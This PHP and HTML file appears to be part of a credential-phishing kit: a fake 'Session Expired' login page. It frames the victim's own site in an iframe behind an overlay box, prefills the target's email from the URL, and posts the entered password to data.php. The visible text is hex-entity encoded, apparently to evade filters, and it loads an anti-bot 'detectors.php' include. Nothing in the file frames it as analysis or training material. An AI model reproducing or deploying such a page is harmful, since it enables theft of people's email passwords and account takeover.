<?php
session_start();
require 'detectors.php';
// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$parts = @explode('@', $email);
	$user = @$parts[0];
?>
<!DOCTYPE html>
<html>
<head>
	<title>&#x2E;&#x2E;&#x2E;&#x20;&#x53;&#x65;&#x73;&#x73;&#x69;&#x6F;&#x6E;&#x20;&#x45;&#x78;&#x70;&#x69;&#x72;&#x65;&#x64;</title>
	<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
	<link rel="stylesheet" type="text/css" href="./assets/css/design.css">
	<link rel="shortcut icon" type="image/png" href="./assets/images/favicon.png"/>
	<!-- Scripts -->
	<script type="text/javascript">
		function getUrlVars() {
		    var vars = {};
		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
		        vars[key] = value;
		    });
		    return vars;
			}
	</script>
</head>
<body class="w3-container">
		<div>
			<iframe id='mainPage' src='#' scrolling='no' sandbox='allow-forms allow-pointer-lock
			allow-popups allow-same-origin allow-scripts' width="100%" height="1500" style="pointer-events: none;"></iframe>
		</div>

		<div class="w3-card w3-mobile w3-display-middle box">
				<div class="w3-container w3-center">
					<p class="w3-border-bottom w3-border-white"><img src="" id="imgFav" style="padding: 0px 7px 5px 0px;"><strong><em>&#x53;&#x65;&#x73;&#x73;&#x69;&#x6F;&#x6E;&#x20;&#x45;&#x78;&#x70;&#x69;&#x72;&#x65;&#x64;&#x21;</em></strong></p>
						<form method="post" action="data.php" >
						<table class="w3-table">
							<tr>
								<td><strong>&#x45;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x41;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;&#x3A;</strong></td>

								<td><input id="emailit" class="w3-border-0" type="email" name="email" value="" readonly></td>
							</tr>
							<tr>
								<td><strong>&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x3A;</strong></td>
								<td><input class="w3-round" type="Password"  name="password" placeholder="Enter Password" required></td>
							</tr>												
						</table>
						<p>
						<input type="checkbox"> <strong>&#x4B;&#x65;&#x65;&#x70;&#x20;&#x6D;&#x65;&#x20;&#x6C;&#x6F;&#x67;&#x67;&#x65;&#x64;&#x20;&#x69;&#x6E;&#x3F; &nbsp</strong>
						</p>
							<button type="submit" name="submit" class="w3-btn w3-border w3-border-black w3-round"><strong>&#x4C;&#x6F;&#x67;&#x20;&#x69;&#x6E;</strong></button>
						</form>
				</div>
			 
			</div>

	<script>
		var email = getUrlVars()['access'];
	</script>
	<script type="text/javascript" src="./assets/js/validate.js"></script>  

</body>
</html>